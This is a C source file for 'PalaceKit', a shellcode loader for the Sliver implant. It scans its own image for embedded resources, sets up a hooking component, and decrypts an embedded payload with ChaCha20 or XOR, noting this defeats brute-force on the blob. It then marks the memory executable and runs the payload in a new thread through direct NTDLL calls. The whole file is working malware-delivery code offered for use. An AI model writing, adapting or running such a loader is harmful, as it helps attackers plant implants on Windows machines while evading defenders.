/*
 * loader.c — PalaceKit Sliver shellcode loader.
 *
 * Entry: go(void *loader_arguments)
 *
 * Flow:
 *   1. Self-protect data region (RW) for any future global writes.
 *   2. Locate embedded resources via magic-marker scan.
 *   3. Set up PICO component (hosts addhook'd runtime hash table).
 *   4. Decrypt and execute the embedded Sliver shellcode.
 *
 * All API calls use the Crystal Palace DFR convention (MODULE$FUNC).
 * PalaceKit resolves these at link time either to a local hook function
 * (via `attach`) or to a generated PEB-resolver thunk.
 *
 * IMPORTANT: this file is included into unity.c — do NOT compile standalone.
 */
#include "loader.h"
#include "services.h"
#include "pico.h"

/* ── Magic-marker resource scanner ────────────────────────────────────────
 * Scan forward from the shellcode base for a 4-byte magic value.
 * The byte immediately after the magic is the start of the RESOURCE struct.   */
void *find_resource_by_magic(uint32_t magic) {
    uint8_t *base;
    __asm__ volatile (
        "call 1f\n\t"
        "1: pop %0\n\t"
        "subq $5, %0\n\t"
        : "=r"(base)
        :
        : "cc"
    );
    for (size_t off = 0; off + 8 <= 0x1000000; off++) {
        uint32_t v;
        __builtin_memcpy(&v, base + off, 4);
        if (v == magic) {
            uint32_t len;
            __builtin_memcpy(&len, base + off + 4, 4);
            if (len < 0x4000000u) /* < 64 MB */
                return (void *)(base + off + 4);
        }
    }
    return NULL;
}

/* ── ChaCha20 stream cipher ───────────────────────────────────────────────
 * Tiny implementation used when the spec encrypts the embedded payload with
 * `chacha20 $KEY $NONCE` instead of `xor $MASK`. Same ChaCha20-IETF variant
 * (32-byte key, 12-byte nonce, 32-bit block counter starting at 0).         */
static uint32_t rotl(uint32_t x, int n) { return (x << n) | (x >> (32 - n)); }

static void chacha20_block(const uint32_t *state, uint8_t *out) {
    uint32_t x[16];
    for (int i = 0; i < 16; i++) x[i] = state[i];
    for (int i = 0; i < 10; i++) {
        #define QR(a,b,c,d) \
            x[a]+=x[b]; x[d]=rotl(x[d]^x[a],16); \
            x[c]+=x[d]; x[b]=rotl(x[b]^x[c],12); \
            x[a]+=x[b]; x[d]=rotl(x[d]^x[a], 8); \
            x[c]+=x[d]; x[b]=rotl(x[b]^x[c], 7)
        QR(0,4, 8,12); QR(1,5, 9,13); QR(2,6,10,14); QR(3,7,11,15);
        QR(0,5,10,15); QR(1,6,11,12); QR(2,7, 8,13); QR(3,4, 9,14);
        #undef QR
    }
    for (int i = 0; i < 16; i++) {
        uint32_t v = x[i] + state[i];
        out[i*4+0] = (uint8_t)(v       );
        out[i*4+1] = (uint8_t)(v >>  8);
        out[i*4+2] = (uint8_t)(v >> 16);
        out[i*4+3] = (uint8_t)(v >> 24);
    }
}

static void chacha20_xor(const uint8_t *key32, const uint8_t *nonce12,
                         const uint8_t *src, uint8_t *dst, uint32_t n) {
    static const char sigma[16] = "expand 32-byte k";
    uint32_t state[16];
    __builtin_memcpy(&state[0], sigma, 16);
    __builtin_memcpy(&state[4], key32, 32);
    state[12] = 0;
    __builtin_memcpy(&state[13], nonce12, 12);

    uint8_t block[64];
    uint32_t off = 0;
    while (off < n) {
        chacha20_block(state, block);
        state[12]++;
        uint32_t take = (n - off > 64) ? 64 : (n - off);
        for (uint32_t i = 0; i < take; i++) dst[off + i] = src[off + i] ^ block[i];
        off += take;
    }
}

/* ── Entry point ── */
void go(void *loader_arguments) {
    uint8_t *data_region = (uint8_t *)loader_arguments;
    ULONG old_prot = 0;
    PVOID base = data_region;
    SIZE_T sz  = 0x1000;
    if (data_region)
        NTDLL$NtProtectVirtualMemory((HANDLE)-1, &base, &sz, PAGE_READWRITE, &old_prot);

    /* Locate PICO and set it up. */
    IMPORTFUNCS funcs;
    funcs.LoadLibraryA   = (HMODULE(*)(LPCSTR))KERNEL32$LoadLibraryA;
    funcs.GetProcAddress = NULL;

    char *pico_src = (char *)find_resource_by_magic(MAGIC_PICO);
    SIZE_T pico_data_size = (SIZE_T)PicoDataSize(pico_src);
    SIZE_T pico_code_size = (SIZE_T)PicoCodeSize(pico_src);

    PVOID pico_data_base = NULL;
    PVOID pico_code_base = NULL;
    NTDLL$NtAllocateVirtualMemory((HANDLE)-1, &pico_data_base, 0, &pico_data_size,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    NTDLL$NtAllocateVirtualMemory((HANDLE)-1, &pico_code_base, 0, &pico_code_size,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    PicoLoad(&funcs, pico_src, (char *)pico_code_base, (char *)pico_data_base);
    pico_set_bases(pico_src, (char *)pico_code_base);

    PVOID pico_code_ptr = pico_code_base;
    NTDLL$NtProtectVirtualMemory((HANDLE)-1, &pico_code_ptr, &pico_code_size,
                                 PAGE_EXECUTE_READ, &old_prot);

    /* Invoke setup_hooks so the PICO can publish its runtime hash table. */
    typedef void (*SETUP_HOOKS)(IMPORTFUNCS *);
    SETUP_HOOKS sh = (SETUP_HOOKS)PicoGetExport(pico_src, (char *)pico_code_base,
                                                __tag_setup_hooks());
    if (sh) sh(&funcs);

    /* Locate and decrypt the embedded Sliver shellcode. */
    RESOURCE *masked_sc = (RESOURCE *)find_resource_by_magic(MAGIC_DLL);
    RESOURCE *mask_key  = (RESOURCE *)find_resource_by_magic(MAGIC_MASK);
    RESOURCE *nonce_res = (RESOURCE *)find_resource_by_magic(MAGIC_NONCE);

    SIZE_T sc_size = (SIZE_T)masked_sc->len;
    PVOID  sc_rw   = NULL;
    NTDLL$NtAllocateVirtualMemory((HANDLE)-1, &sc_rw, 0, &sc_size,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    uint8_t *dst    = (uint8_t *)sc_rw;
    uint8_t *src    = masked_sc->value;
    uint8_t *key    = mask_key->value;
    uint32_t keylen = mask_key->len;

    if (nonce_res && nonce_res->len == 12 && keylen == 32) {
        /* ChaCha20 path — strong stream cipher, defeats brute-force on the blob. */
        chacha20_xor(key, nonce_res->value, src, dst, masked_sc->len);
    } else {
        /* XOR fallback — backwards compatible with existing specs. */
        for (uint32_t i = 0; i < masked_sc->len; i++)
            dst[i] = src[i] ^ key[i % keylen];
    }

    /* Flip RX and execute. */
    PVOID sc_ptr = sc_rw;
    NTDLL$NtProtectVirtualMemory((HANDLE)-1, &sc_ptr, &sc_size,
                                 PAGE_EXECUTE_READ, &old_prot);

    HANDLE hThread = NULL;
    NTDLL$NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
                           sc_rw, NULL, 0, 0, 0, 0, NULL);
    if (hThread)
        NTDLL$NtWaitForSingleObject(hThread, FALSE, NULL);

    /* setup_memory: no-op for Sliver; preserved for source compatibility. */
    typedef void (*SETUP_MEMORY)(MEMORY_LAYOUT *);
    SETUP_MEMORY sm = (SETUP_MEMORY)PicoGetExport(pico_src, (char *)pico_code_base,
                                                  __tag_setup_memory());
    if (sm) {
        MEMORY_LAYOUT memory = {0};
        memory.Pico.Data = pico_data_base;
        memory.Pico.Code = pico_code_base;
        sm(&memory);
    }

    SIZE_T zero = 0;
    NTDLL$NtFreeVirtualMemory((HANDLE)-1, &sc_rw, &zero, MEM_RELEASE);
}
